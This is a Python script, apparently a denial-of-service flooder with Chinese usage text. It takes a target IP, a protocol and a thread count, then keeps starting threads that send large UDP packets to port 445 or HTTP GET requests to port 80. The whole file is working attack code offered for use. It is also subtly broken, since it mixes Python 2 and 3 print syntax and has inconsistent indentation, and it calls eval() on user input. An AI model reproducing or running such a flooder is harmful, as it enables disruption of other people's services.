#coding:utf-8
import socket,sys,threading
import time

if len(sys.argv)!=4:
    print('使用方法:\n'+sys.argv[0],'目标ip','协议[tcp | udp]','线程数')
    sys.exit(1)
    
ip=sys.argv[1]
tp='send'+sys.argv[2].strip().lower()
tno=int(sys.argv[3])

udpdata=b'a'*40960

tcpdata='''GET / HTTP/1.1
Connection: keep-alive
Host: {}
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko)
Chrome/17.0.963.46 Safari/535.11
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3

'''.format(ip).encode()

def sendudp(host,port=445):
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.sendto(udpdata,(host,port))


def sendtcp(host,port=80):
    s=socket.socket()
    s.connect((host,port))
    s.send(tcpdata)
    s.close()


def mythread():
    tlst = []
    for i in range(tno):
    	th=threading.Thread(target=eval(tp),args=(ip,))
    	tlst.append(th)
    
    for i in tlst:
    	i.start()

def main():
    try:
	while True:
            mythread()
	    time.sleep(0.05) 

    except (KeyboardInterrupt, SystemExit):
        print "CTRL+C received. Killing all workers"

if __name__ == "__main__":
    main()




